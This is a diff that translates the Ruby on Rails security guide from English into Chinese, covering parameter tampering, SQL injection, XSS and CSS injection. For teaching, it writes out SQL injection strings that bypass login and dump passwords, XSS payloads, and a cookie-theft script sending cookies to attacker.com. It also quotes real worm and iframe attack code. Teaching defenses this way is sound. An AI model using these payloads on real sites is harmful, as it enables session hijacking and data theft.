-Since this is a frequent mistake, the format validator (validates_format_of) now raises an exception if the provided regular expression starts with ^ or ends with $. If you do need to use ^ and $ instead of \A and \z (which is rare), you can set the :multiline option to true, like so:
+因为这种问题经常出现，如果使用的正则表达式以 `^` 开头，或者以 `$` 结尾，格式验证器（`validates_format_of`）会抛出异常。如果确实需要使用 `^` 和 `$`（但很少见），可以把 `:multiline` 选项设为 `true`，如下所示：
 
-```ruby
-  # content should include a line "Meanwhile" anywhere in the string
-  validates :content, format: { with: /^Meanwhile$/, multiline: true }
-```
+{:lang="ruby"}
+~~~
+# content should include a line "Meanwhile" anywhere in the string
+validates :content, format: { with: /^Meanwhile$/, multiline: true }
+~~~
 
-Note that this only protects you against the most common mistake when using the format validator - you always need to keep in mind that ^ and $ match the **line** beginning and line end in Ruby, and not the beginning and end of a string.
+注意，这种方式只能避免格式验证中出现的常见错误。你要牢记，在 Ruby 中 `^` 和 `$` 分别匹配**行**的开头和结尾，不是整个字符串的开头和结尾。
 
-### Privilege Escalation
+### 权限提升 {#privilege-escalation}
 
-WARNING: _Changing a single parameter may give the user unauthorized access. Remember that every parameter may be changed, no matter how much you hide or obfuscate it._
+W> 只需修改一个参数就可能赋予用户未授权的权限。记住，不管你怎么隐藏参数，还是可能被修改。
 
-The most common parameter that a user might tamper with, is the id parameter, as in `http://www.domain.com/project/1`, whereas 1 is the id. It will be available in params in the controller. There, you will most likely do something like this:
+用户最可能篡改的参数是 ID，例如在 `http://www.domain.com/project/1` 中，ID 为 1，这个参数的值在控制器中可通过 `params` 获取。在控制器中可能会做如下的查询：
 
-```ruby
+{:lang="ruby"}
+~~~
 @project = Project.find(params[:id])
-```
+~~~
 
-This is alright for some web applications, but certainly not if the user is not authorized to view all projects. If the user changes the id to 42, and they are not allowed to see that information, they will have access to it anyway. Instead, _query the user's access rights, too_:
+在某些程序中这么做没问题，但如果用户没权限查看所有项目就不能这么做。如果用户把 ID 改为 42，但其实无权查看这个项目的信息，用户还是能够看到。我们应该同时查询用户的访问权限：
 
-```ruby
+{:lang="ruby"}
+~~~
 @project = @current_user.projects.find(params[:id])
-```
+~~~
 
-Depending on your web application, there will be many more parameters the user can tamper with. As a rule of thumb, _no user input data is secure, until proven otherwise, and every parameter from the user is potentially manipulated_.
+不同的程序用户可篡改的参数也不同，谨记一个原则，用户输入的数据未经验证之前都是不安全的，传入的每个参数都有潜在危险。
 
-Don't be fooled by security by obfuscation and JavaScript security. The Web Developer Toolbar for Mozilla Firefox lets you review and change every form's hidden fields. _JavaScript can be used to validate user input data, but certainly not to prevent attackers from sending malicious requests with unexpected values_. The Live Http Headers plugin for Mozilla Firefox logs every request and may repeat and change them. That is an easy way to bypass any JavaScript validations. And there are even client-side proxies that allow you to intercept any request and response from and to the Internet.
+别傻了，隐藏参数或者使用 JavaScript 根本就无安全性可言。使用 Firefox 的开发者工具可以修改表单中的每个隐藏字段。JavaScript 只能验证用户的输入数据，但不能避免攻击者发送恶意请求。Firefox 的 Live Http Headers 插件可以记录每次请求，而且能重复请求或者修改请求内容，很容易就能跳过 JavaScript 验证。有些客户端代理还能拦截任意请求和响应。
 
-Injection
----------
+## 注入 {#injection}
 
-INFO: _Injection is a class of attacks that introduce malicious code or parameters into a web application in order to run it within its security context. Prominent examples of injection are cross-site scripting (XSS) and SQL injection._
+I> 注入这种攻击方式可以把恶意代码或参数写入程序，在程序所谓安全的环境中执行。常见的注入方式有跨站脚本和 SQL 注入。
 
-Injection is very tricky, because the same code or parameter can be malicious in one context, but totally harmless in another. A context can be a scripting, query or programming language, the shell or a Ruby/Rails method. The following sections will cover all important contexts where injection attacks may happen. The first section, however, covers an architectural decision in connection with Injection.
+注入具有一定技巧性，一段代码或参数在一个场合是恶意的，但换个场合可能就完全无害。这里所说的“场合”可以是一个脚本，查询，编程语言，shell 或者 Ruby/Rails 方法。下面各节分别介绍注入攻击可能发生的场合。不过，首先我们要说明和注入有关的架构决策。
 
-### Whitelists versus Blacklists
+### 白名单 VS. 很名单 {#whitelists-versus-blacklists}
 
-NOTE: _When sanitizing, protecting or verifying something, prefer whitelists over blacklists._
+I> 过滤、保护或者验证时白名单比黑名单好。
 
-A blacklist can be a list of bad e-mail addresses, non-public actions or bad HTML tags. This is opposed to a whitelist which lists the good e-mail addresses, public actions, good HTML tags and so on. Although sometimes it is not possible to create a whitelist (in a SPAM filter, for example), _prefer to use whitelist approaches_:
+黑名单可以是一组不可用的 Email 地址，非公开的动作或者不能使用的 HTML 标签。白名单则相反，是一组可用的 Email 地址，公开的动作和可用的 HTML 标签。某些情况下无法创建白名单（例如，垃圾信息过滤），但下列场合推荐使用白名单：
 
-* Use before_action only: [...] instead of except: [...]. This way you don't forget to turn it off for newly added actions.
-* Allow &lt;strong&gt; instead of removing &lt;script&gt; against Cross-Site Scripting (XSS). See below for details.
-* Don't try to correct user input by blacklists:
-    * This will make the attack work: "&lt;sc&lt;script&gt;ript&gt;".gsub("&lt;script&gt;", "")
-    * But reject malformed input
+* `before_action` 的选项使用 `only: [...]`，而不是 `except: [...]`。这样做，新建的动作就不会误入 `before_action`。
+* 防范跨站脚本时推荐加上 `<strong>` 标签，不要删除 `<script>` 元素。详情参见后文。
+* 不要尝试使用黑名单修正用户的输入
+    * 这么做会成全这种攻击：`"<sc<script>ript>".gsub("<script>", "")`
+    * 直接拒绝即可
 
-Whitelists are also a good approach against the human factor of forgetting something in the blacklist.
+使用白名单还能避免忘记黑名单中的内容。
 
-### SQL Injection
+### SQL 注入 {#sql-injection}
 
-INFO: _Thanks to clever methods, this is hardly a problem in most Rails applications. However, this is a very devastating and common attack in web applications, so it is important to understand the problem._
+I> Rails 中的方法足够智能，能避免 SQL 注入。但 SQL 注入是网页程序中比较常见且危险性高的攻击方式，因此有必要了解一下。
 
-#### Introduction
+#### 简介 {#sql-injection-introduction}
 
-SQL injection attacks aim at influencing database queries by manipulating web application parameters. A popular goal of SQL injection attacks is to bypass authorization. Another goal is to carry out data manipulation or reading arbitrary data. Here is an example of how not to use user input data in a query:
+SQL 注入通过修改传入程序的参数，影响数据库查询。常见目的是跳过授权管理系统，处理数据或读取任意数据。下面举例说明为什么要避免在查询中使用用户输入的数据。
 
-```ruby
+{:lang="ruby"}
+~~~
 Project.where("name = '#{params[:name]}'")
-```
+~~~
 
-This could be in a search action and the user may enter a project's name that they want to find. If a malicious user enters ' OR 1 --, the resulting SQL query will be:
+这个查询可能出现在搜索动作中，用户输入想查找的项目名。如果恶意用户输入 `' OR 1 --`，得到的 SQL 查询为：
 
-```sql
+{:lang="sql"}
+~~~
 SELECT * FROM projects WHERE name = '' OR 1 --'
-```
+~~~
 
-The two dashes start a comment ignoring everything after it. So the query returns all records from the projects table including those blind to the user. This is because the condition is true for all records.
+两根横线表明注释开始，后面所有的语句都会被忽略。所以上述查询会读取 `projects` 表中所有记录，包括向用户隐藏的记录。这是因为所有记录都满足查询条件。
 
-#### Bypassing Authorization
+#### 跳过授权 {#bypassing-authorization}
 
-Usually a web application includes access control. The user enters their login credentials and the web application tries to find the matching record in the users table. The application grants access when it finds a record. However, an attacker may possibly bypass this check with SQL injection. The following shows a typical database query in Rails to find the first record in the users table which matches the login credentials parameters supplied by the user.
+网页程序中一般都有访问控制功能。用户输入登录密令后，网页程序试着在用户数据表中找到匹配的记录。如果找到了记录就赋予用户相应的访问权限。不过，攻击者可通过 SQL 注入跳过这种检查。下面显示了 Rails 中一个常见的数据库查询，在用户表中查询匹配用户输入密令的第一个记录。
 
-```ruby
+{:lang="ruby"}
+~~~
 User.first("login = '#{params[:name]}' AND password = '#{params[:password]}'")
-```
+~~~
 
-If an attacker enters ' OR '1'='1 as the name, and ' OR '2'>'1 as the password, the resulting SQL query will be:
+如果用户输入的 `name` 参数值为 `' OR '1'='1`，`password` 参数的值为 `' OR '2'>'1`，得到的 SQL 查询为：
 
-```sql
+{:lang="sql"}
+~~~
 SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1
-```
+~~~
 
-This will simply find the first record in the database, and grants access to this user.
+这个查询直接在数据库中查找第一个记录，然后赋予其相应的权限。
 
-#### Unauthorized Reading
+#### 未经授权读取数据 {#unauthorized-reading}
 
-The UNION statement connects two SQL queries and returns the data in one set. An attacker can use it to read arbitrary data from the database. Let's take the example from above:
+`UNION` 语句连接两个 SQL 查询，返回的结果只有一个集合。攻击者利用 `UNION` 语句可以从数据库中读取任意数据。下面来看个例子：
 
-```ruby
+{:lang="ruby"}
+~~~
 Project.where("name = '#{params[:name]}'")
-```
+~~~
 
-And now let's inject another query using the UNION statement:
+注入一个使用 `UNION` 语句的查询：
 
-```
+~~~
 ') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
-```
+~~~
 
-This will result in the following SQL query:
+得到的 SQL 查询如下：
 
-```sql
+{:lang="sql"}
+~~~
 SELECT * FROM projects WHERE (name = '') UNION
   SELECT id,login AS name,password AS description,1,1,1 FROM users --'
-```
+~~~
 
-The result won't be a list of projects (because there is no project with an empty name), but a list of user names and their password. So hopefully you encrypted the passwords in the database! The only problem for the attacker is, that the number of columns has to be the same in both queries. That's why the second query includes a list of ones (1), which will be always the value 1, in order to match the number of columns in the first query.
+上述查询的结果不是一个项目集合（因为找不到没有名字的项目），而是一组由用户名和密码组成的集合。真希望你加密了存储在数据库中的密码！攻击者要为两个查询语句提供相同的字段数量。所以在第二个查询中有很多 `1`。攻击者可以总是使用 `1`，只要字段的数量和第一个查询一样即可。
 
-Also, the second query renames some columns with the AS statement so that the web application displays the values from the user table. Be sure to update your Rails [to at least 2.1.1](http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/).
+而且，第二个查询使用 `AS` 语句重命名了某些字段，这样程序就能显示出从用户表中查询得到的数据。
 
-#### Countermeasures
+#### 对策 {#sql-injection-countermeasures}
 
-Ruby on Rails has a built-in filter for special SQL characters, which will escape ' , " , NULL character and line breaks. <em class="highlight">Using `Model.find(id)` or `Model.find_by_some thing(something)` automatically applies this countermeasure</em>. But in SQL fragments, especially <em class="highlight">in conditions fragments (`where("...")`), the `connection.execute()` or `Model.find_by_sql()` methods, it has to be applied manually</em>.
+Rails 内建了能过滤 SQL 中特殊字符的过滤器，会转义 `'`、`"`、`NULL` 和换行符。`Model.find(id)` 和 `Model.find_by_something(something)` 会自动使用这个过滤器。但在 SQL 片段中，尤其是条件语句（`where("...")`），`connection.execute()` 和 `Model.find_by_sql()` 方法，需要手动调用过滤器。
 
-Instead of passing a string to the conditions option, you can pass an array to sanitize tainted strings like this:
+请不要直接传入条件语句，而要传入一个数组，进行过滤。如下所示：
 
-```ruby
+{:lang="ruby"}
+~~~
 Model.where("login = ? AND password = ?", entered_user_name, entered_password).first
-```
+~~~
 
-As you can see, the first part of the array is an SQL fragment with question marks. The sanitized versions of the variables in the second part of the array replace the question marks. Or you can pass a hash for the same result:
+如上所示，数组的第一个元素是包含问号的 SQL 片段，要过滤的内容是数组其后的元素，过滤后的值会替换第一个元素中的问号。传入 Hash 的作用相同：
 
-```ruby
+{:lang="ruby"}
+~~~
 Model.where(login: entered_user_name, password: entered_password).first
-```
+~~~
 
-The array or hash form is only available in model instances. You can try `sanitize_sql()` elsewhere. _Make it a habit to think about the security consequences when using an external string in SQL_.
+数组或 Hash 形式只能在模型实例上使用。其他地方可使用 `sanitize_sql()` 方法。在 SQL 中使用外部字符串时要时刻警惕安全性。
 
-### Cross-Site Scripting (XSS)
+### 跨站脚本 {#cross-site-scripting-xss}
 
-INFO: _The most widespread, and one of the most devastating security vulnerabilities in web applications is XSS. This malicious attack injects client-side executable code. Rails provides helper methods to fend these attacks off._
+I> 网页程序中影响范围最广、危害性最大的安全漏洞是跨站脚本。这种恶意攻击方式在客户端注入可执行的代码。Rails 提供了防御这种攻击的帮助方法。
 
-#### Entry Points
+#### 切入点 {#entry-points}
 
-An entry point is a vulnerable URL and its parameters where an attacker can start an attack.
+切入点是攻击者可用来发起攻击的漏洞 URL 地址和其参数。
 
-The most common entry points are message posts, user comments, and guest books, but project titles, document names and search result pages have also been vulnerable - just about everywhere where the user can input data. But the input does not necessarily have to come from input boxes on web sites, it can be in any URL parameter - obvious, hidden or internal. Remember that the user may intercept any traffic. Applications, such as the [Live HTTP Headers Firefox plugin](http://livehttpheaders.mozdev.org/), or client-site proxies make it easy to change requests.
+常见的切入点有文章、用户评论、留言本，项目的标题、文档的名字和搜索结果页面也经常受到攻击，只要用户能输入数据的地方都有危险。输入的数据不一定来自网页中的输入框，也可以来自任何 URL 参数（公开参数，隐藏参数或者内部参数）。记住，用户能拦截任何通信。Firefox 的 [Live HTTP Headers](http://livehttpheaders.mozdev.org/) 插件，以及客户端代码能轻易的修改请求数据。
 
-XSS attacks work like this: An attacker injects some code, the web application saves it and displays it on a page, later presented to a victim. Most XSS examples simply display an alert box, but it is more powerful than that. XSS can steal the cookie, hijack the session, redirect the victim to a fake website, display advertisements for the benefit of the attacker, change elements on the web site to get confidential information or install malicious software through security holes in the web browser.
+跨站脚本攻击的工作方式是这样的：攻击者注入一些代码，程序将其保存并在页面中显示出来。大多数跨站脚本只显示一个弹窗，但危险性极大。跨站脚本可以窃取 cookie，劫持会话，把用户引向虚假网站，显示广告让攻击者获利，修改网页中的元素获取机密信息，或者通过浏览器的安全漏洞安装恶意软件。
 
-During the second half of 2007, there were 88 vulnerabilities reported in Mozilla browsers, 22 in Safari, 18 in IE, and 12 in Opera. The [Symantec Global Internet Security threat report](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf) also documented 239 browser plug-in vulnerabilities in the last six months of 2007. [Mpack](http://pandalabs.pandasecurity.com/mpack-uncovered/) is a very active and up-to-date attack framework which exploits these vulnerabilities. For criminal hackers, it is very attractive to exploit an SQL-Injection vulnerability in a web application framework and insert malicious code in every textual table column. In April 2008 more than 510,000 sites were hacked like this, among them the British government, United Nations, and many more high targets.
+2007 年下半年，Mozilla 浏览器发现了 88 个漏洞，Safari 发现了 22 个漏洞，IE 发现了 18 个漏洞，Opera 发现了 12 个漏洞。[赛门铁克全球互联网安全威胁报告](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf)指出，2007 年下半年共发现了 238 个浏览器插件导致的漏洞。对黑客来说，网页程序框架爆出的 SQL 注入漏洞很具吸引力，他们可以利用这些漏洞在数据表中的每个文本字段中插入恶意代码。2008 年 4 月，有 510000 个网站被这种方法攻破，其中英国政府和美国政府的网站是最大的目标。
 
-A relatively new, and unusual, form of entry points are banner advertisements. In earlier 2008, malicious code appeared in banner ads on popular sites, such as MySpace and Excite, according to [Trend Micro](http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/).
+一个相对较新、不常见的切入点是横幅广告。[Trend Micro](http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/) 的文章指出，2008 年早些时候在流行的网站（例如 MySpace 和 Excite）中发现了横幅广告中包含恶意代码。
 
-#### HTML/JavaScript Injection
+#### HTML/JavaScript 注入 {#html-javascript-injection}
 
-The most common XSS language is of course the most popular client-side scripting language JavaScript, often in combination with HTML. _Escaping user input is essential_.
+跨站脚本最常用的语言当然是使用最广泛的客户端脚本语言 JavaScript，而且经常掺有 HTML。转义用户的输入是最基本的要求。
 
-Here is the most straightforward test to check for XSS:
+下面是一段最直接的跨站脚本：
 
-```html
+{:lang="html"}
+~~~
 <script>alert('Hello');</script>
-```
+~~~
 
-This JavaScript code will simply display an alert box. The next examples do exactly the same, only in very uncommon places:
+上面的 JavaScript 只是显示一个提示框。下面的例子作用相同，但放在不太平常的地方：
 
-```html
+{:lang="html"}
+~~~
 <img src=javascript:alert('Hello')>
 <table background="javascript:alert('Hello')">
-```
+~~~
 
-##### Cookie Theft
+##### 盗取 cookie {#cookie-theft}
 
-These examples don't do any harm so far, so let's see how an attacker can steal the user's cookie (and thus hijack the user's session). In JavaScript you can use the document.cookie property to read and write the document's cookie. JavaScript enforces the same origin policy, that means a script from one domain cannot access cookies of another domain. The document.cookie property holds the cookie of the originating web server. However, you can read and write this property, if you embed the code directly in the HTML document (as it happens with XSS). Inject this anywhere in your web application to see your own cookie on the result page:
+上面的例子没什么危害，下面来看一下攻击者如何盗取用户 cookie（因此也能劫持会话）。在 JavaScript 中，可以使用 `document.cookie` 读写 cookie。JavaScript 强制使用同源原则，即一个域中的脚本无法访问另一个域中的 cookie。`document.cookie` 属性中保存的 cookie 来自源服务器。不过，如果直接把代码放在 HTML 文档中（就跟跨站脚本一样），就可以读写这个属性。把下面的代码放在程序的任何地方，看一下页面中显示的 cookie 值：
 
-```
+{:lang="html"}
+~~~
 <script>document.write(document.cookie);</script>
-```
+~~~
 
-For an attacker, of course, this is not useful, as the victim will see their own cookie. The next example will try to load an image from the URL http://www.attacker.com/ plus the cookie. Of course this URL does not exist, so the browser displays nothing. But the attacker can review their web server's access log files to see the victim's cookie.
+对攻击者来说，这么做没什么用，因为用户看到了自己的 cookie。下面这个例子会从 http://www.attacker.com/ 加载一个图片和 cookie。当然，这个地址并不存在，因此浏览器什么也不会显示。但攻击者可以查看服务器的访问日志获取用户的 cookie。
 
-```html
+{:lang="html"}
+~~~
 <script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
-```
+~~~
 
-The log files on www.attacker.com will read like this:
+www.attacker.com 服务器上的日志文件中可能有这么一行记录：
 
-```
+~~~
 GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
-```
+~~~
 
-You can mitigate these attacks (in the obvious way) by adding the [httpOnly](http://dev.rubyonrails.org/ticket/8895) flag to cookies, so that document.cookie may not be read by JavaScript. Http only cookies can be used from IE v6.SP1, Firefox v2.0.0.5 and Opera 9.5. Safari is still considering, it ignores the option. But other, older browsers (such as WebTV and IE 5.5 on Mac) can actually cause the page to fail to load. Be warned that cookies [will still be visible using Ajax](http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/), though.
+在 cookie 中加上 [httpOnly](http://dev.rubyonrails.org/ticket/8895) 标签可以避免这种攻击，加上 httpOnly 后，JavaScript 就无法读取 `document.cookie` 属性的值。IE v6.SP1、Firefox v2.0.0.5 和 Opera 9.5 都支持只能使用 HTTP 请求访问的 cookie，Safari 还在考虑这个功能，暂时会忽略这个选项。但在其他浏览器，或者旧版本的浏览器（例如 WebTV 和 Mac 系统中的 IE 5.5）中无法加载页面。有一点要注意，使用 [Ajax 仍可读取 cookie](http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/)。
 
-##### Defacement
+##### 涂改 {#defacement}
 
-With web page defacement an attacker can do a lot of things, for example, present false information or lure the victim on the attackers web site to steal the cookie, login credentials or other sensitive data. The most popular way is to include code from external sources by iframes:
+攻击者可通过网页涂改做很多事情，例如，显示错误信息，或者引导用户到攻击者的网站，偷取登录密码或者其他敏感信息。最常见的涂改方法是使用 iframe 加载外部代码：
 
-```html
+{:lang="html"}
+~~~
 <iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"></iframe>
-```
+~~~
 
-This loads arbitrary HTML and/or JavaScript from an external source and embeds it as part of the site. This iframe is taken from an actual attack on legitimate Italian sites using the [Mpack attack framework](http://isc.sans.org/diary.html?storyid=3015). Mpack tries to install malicious software through security holes in the web browser - very successfully, 50% of the attacks succeed.
+iframe 可以从其他网站加载任何 HTML 和 JavaScript。上述 iframe 是使用 [Mpack 框架](http://isc.sans.org/diary.html?storyid=3015)攻击意大利网站的真实代码。Mpack 尝试通过浏览器的安全漏洞安装恶意软件，成功率很高，有 50% 的攻击成功了。
 
-A more specialized attack could overlap the entire web site or display a login form, which looks the same as the site's original, but transmits the user name and password to the attacker's site. Or it could use CSS and/or JavaScript to hide a legitimate link in the web application, and display another one at its place which redirects to a fake web site.
+更特殊的攻击是完全覆盖整个网站，或者显示一个登陆框，看去来和原网站一模一样，但把用户名和密码传给攻击者的网站。还可使用 CSS 或 JavaScript 把网站中原来的链接隐藏，换上另一个链接，把用户带到仿冒网站上。
 
-Reflected injection attacks are those where the payload is not stored to present it to the victim later on, but included in the URL. Especially search forms fail to escape the search string. The following link presented a page which stated that "George Bush appointed a 9 year old boy to be the chairperson...":
+还有一种攻击方式不保存信息，把恶意代码包含在 URL 中。如果搜索表单不过滤搜索关键词，这种攻击就更容易实现。下面这个链接显示的页面中包含这句话“乔治&bull;布什任命 9 岁男孩为主席...”：
 
-```
+~~~
 http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
   <script src=http://www.securitylab.ru/test/sc.js></script><!--
-```
+~~~
 
-##### Countermeasures
+##### 对策 {#html-javascript-injection-countermeasures}
 
-_It is very important to filter malicious input, but it is also important to escape the output of the web application_.
+I> 过滤恶意输入很重要，转义输出也同样重要。
 
-Especially for XSS, it is important to do _whitelist input filtering instead of blacklist_. Whitelist filtering states the values allowed as opposed to the values not allowed. Blacklists are never complete.
+对跨站脚本来说，过滤输入值一定要使用白名单而不是黑名单。白名单指定允许输入的值。黑名单则指定不允许输入的值，无法涵盖所有禁止的值。
 
-Imagine a blacklist deletes "script" from the user input. Now the attacker injects "&lt;scrscriptipt&gt;", and after the filter, "&lt;script&gt;" remains. Earlier versions of Rails used a blacklist approach for the strip_tags(), strip_links() and sanitize() method. So this kind of injection was possible:
+假设黑名单从用户的输入值中删除了 `script`，但如果攻击者输入 `<scrscriptipt>`，过滤后剩余的值是 `<script>`。在以前版本的 Rails 中，`strip_tags()`、`strip_links()` 和 `sanitize()` 方法使用黑名单。所以下面这种注入完全可行：
 
-```ruby
+{:lang="ruby"}
+~~~
 strip_tags("some<<b>script>alert('hello')<</b>/script>")
-```
+~~~
 
-This returned "some&lt;script&gt;alert('hello')&lt;/script&gt;", which makes an attack work. That's why a whitelist approach is better, using the updated Rails 2 method sanitize():
+上述方法的返回值是 `some<script>alert('hello')</script>`，仍然可以发起攻击。所以我才支持使用白名单，使用 Rails 2 中升级后的 `sanitize()` 方法：
 
-```ruby
+{:lang="ruby"}
+~~~
 tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
 s = sanitize(user_input, tags: tags, attributes: %w(href title))
-```
+~~~
 
-This allows only the given tags and does a good job, even against all kinds of tricks and malformed tags.
+这个方法只允许使用指定的标签，效果很好，能对付各种诡计和改装的标签。
 
-As a second step, _it is good practice to escape all output of the application_, especially when re-displaying user input, which hasn't been input-filtered (as in the search form example earlier on). _Use `escapeHTML()` (or its alias `h()`) method_ to replace the HTML input characters &amp;, &quot;, &lt;, &gt; by their uninterpreted representations in HTML (`&amp;`, `&quot;`, `&lt`;, and `&gt;`). However, it can easily happen that the programmer forgets to use it, so _it is recommended to use the SafeErb gem. SafeErb reminds you to escape strings from external sources.
+而后，还要转义程序的所有输出，尤其是要转义输入时没有过滤的用户输入值（例如前面举过的搜索表单例子）。使用 `escapeHTML()` 方法（或者别名 `h()`）把 HTML 中的 `&`、`"`、`<` 和`>` 字符替换成 `&amp;`、`&quot;`、`&lt;` 和 `&gt;`。不过开发者很容易忘记这么做，所以推荐使用 [SafeErb](http://safe-erb.rubyforge.org/svn/plugins/safe_erb/) 插件，SafeErb 会提醒你转义外部字符串。
 
-##### Obfuscation and Encoding Injection
+##### 编码注入 {#obfuscation-and-encoding-injection}
 
-Network traffic is mostly based on the limited Western alphabet, so new character encodings, such as Unicode, emerged, to transmit characters in other languages. But, this is also a threat to web applications, as malicious code can be hidden in different encodings that the web browser might be able to process, but the web application might not. Here is an attack vector in UTF-8 encoding:
+网络流量大都使用有限的西文字母传输，所以后来出现了新的字符编码方式传输其他语种的字符。这也为网页程序带来了新的威胁，因为恶意代码可以隐藏在不同的编码字符中，浏览器可以处理这些编码，但网页程序不一定能处理。下面是使用 UTF-8 编码攻击的例子：
 
-```
+~~~
 <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
   &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
-```
+~~~
 
-This example pops up a message box. It will be recognized by the above sanitize() filter, though. A great tool to obfuscate and encode strings, and thus "get to know your enemy", is the [Hackvertor](https://hackvertor.co.uk/public). Rails' sanitize() method does a good job to fend off encoding attacks.
+上面的代码会弹出一个提示框。`sanitize()` 方法可以识别这种代码。编码字符串的一个好用工具是 [Hackvertor](https://hackvertor.co.uk/public)，使用这个工具可以做到知己知彼。Rails 的 `sanitize()` 方法能有效避免编码攻击。
 
-#### Examples from the Underground
+#### 真实案例 {#examples-from-the-underground}
 
-_In order to understand today's attacks on web applications, it's best to take a look at some real-world attack vectors._
+要想理解现今对网页程序的攻击方式，最好看几个真实案例。
 
-The following is an excerpt from the [Js.Yamanner@m](http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1) Yahoo! Mail [worm](http://groovin.net/stuff/yammer.txt). It appeared on June 11, 2006 and was the first webmail interface worm:
+下面的代码摘自针对 Yahoo! 邮件的[蠕虫病毒](http://groovin.net/stuff/yammer.txt)，由 [Js.Yamanner@m](http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1) 制作，发生在 2006 年 6 月 11 日，是第一个针对网页邮件客户端的蠕虫病毒：
 
-```
+~~~
 <img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
   target=""onload="var http_request = false;    var Email = '';
   var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
-```
+~~~
 
-The worms exploits a hole in Yahoo's HTML/JavaScript filter, which usually filters all target and onload attributes from tags (because there can be JavaScript). The filter is applied only once, however, so the onload attribute with the worm code stays in place. This is a good example why blacklist filters are never complete and why it is hard to allow HTML/JavaScript in a web application.
+这个蠕虫病毒利用 Yahoo 的 HTML/JavaScript 过滤器漏洞。这个过滤器过滤标签中所有的 `target` 和 `onload` 属性，因为这两个属性的值可以是 JavaScript 代码。这个过滤器只会执行一次，所以包含蠕虫病毒代码的 `onload` 属性不会被过滤掉。这个例子很好的说明了黑名单很难以偏概全，也说明了在网页程序中为什么很难提供输入 HTML/JavaScript 的支持。
 
-Another proof-of-concept webmail worm is Nduja, a cross-domain worm for four Italian webmail services. Find more details on [Rosario Valotta's paper](http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/). Both webmail worms have the goal to harvest email addresses, something a criminal hacker could make money with.
+还有一个概念性的蠕虫是 Nduja，这个蠕虫可以跨域攻击四个意大利网页邮件服务。详情参见 [Rosario Valotta 的论文](http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/)。以上两种邮件蠕虫的目的都是获取 Email 地址，黑客可从中获利。
 
-In December 2006, 34,000 actual user names and passwords were stolen in a [MySpace phishing attack](http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html). The idea of the attack was to create a profile page named "login_home_index_html", so the URL looked very convincing. Specially-crafted HTML and CSS was used to hide the genuine MySpace content from the page and instead display its own login form.
+2006 年 12 月，一次 [MySpace 钓鱼攻击](http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html)泄露了 34000 个真实地用户名和密码。这次攻击的方式是创建一个名为“login_home_index_html”的资料页，URL 地址看起来很正常，但使用了精心制作的 HTML 和 CSS 隐藏真实的由 MySpace 生成的内容，显示了一个登录表单。
 
-The MySpace Samy worm will be discussed in the CSS Injection section.
+MySpace Samy 蠕虫在“[CSS 注入](#css-injection)”一节说明。
 
-### CSS Injection
+### CSS 注入 {#css-injection}
 
-INFO: _CSS Injection is actually JavaScript injection, because some browsers (IE, some versions of Safari and others) allow JavaScript in CSS. Think twice about allowing custom CSS in your web application._
+I> CSS 注入其实就是 JavaScript 注入，因为有些浏览器（IE，某些版本的 Safari 等）允许在 CSS 中使用 JavaScript。允许在程序中使用自定义的 CSS 时一定要三思。
 
-CSS Injection is explained best by a well-known worm, the [MySpace Samy worm](http://namb.la/popular/tech.html). This worm automatically sent a friend request to Samy (the attacker) simply by visiting his profile. Within several hours he had over 1 million friend requests, but it creates too much traffic on MySpace, so that the site goes offline. The following is a technical explanation of the worm.
+CSS 注入的原理可以通过有名的 [MySpace Samy 蠕虫](http://namb.la/popular/tech.html)说明。访问 Samy（攻击者）的 MySpace 资料页时会自动向 Samy 发出好友请求。几小时之内 Samy 就收到了超过一百万个好友请求，消耗了 MySpace 大量流量，导致网站瘫痪。下面从技术层面分析这个蠕虫。
 
-MySpace blocks many tags, however it allows CSS. So the worm's author put JavaScript into CSS like this:
+MySpace 禁止使用很多标签，但却允许使用 CSS。所以，蠕虫的作者按照下面的方式在 CSS 中加入了 JavaScript 代码：
 
-```html
+{:lang="html"}
+~~~
 <div style="background:url('javascript:alert(1)')">
-```
+~~~
 
-So the payload is in the style attribute. But there are no quotes allowed in the payload, because single and double quotes have already been used. But JavaScript has a handy eval() function which executes any string as code.
+因此问题的关键是 `style` 属性，但属性的值中不能含有引号，因为单引号和双引号都已经使用了。但是 JavaScript 中有个很实用的 `eval()` 函数，可以执行任意字符串：
 
-```html
+{:lang="html"}
+~~~
 <div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">
-```
+~~~
 
-The eval() function is a nightmare for blacklist input filters, as it allows the style attribute to hide the word "innerHTML":
+`eval()` 函数对黑名单过滤来说是个噩梦，可以把 `innerHTML` 隐藏在 `style` 属性中：
 
-```
+{:lang="js"}
+~~~
 alert(eval('document.body.inne' + 'rHTML'));
-```
+~~~
 
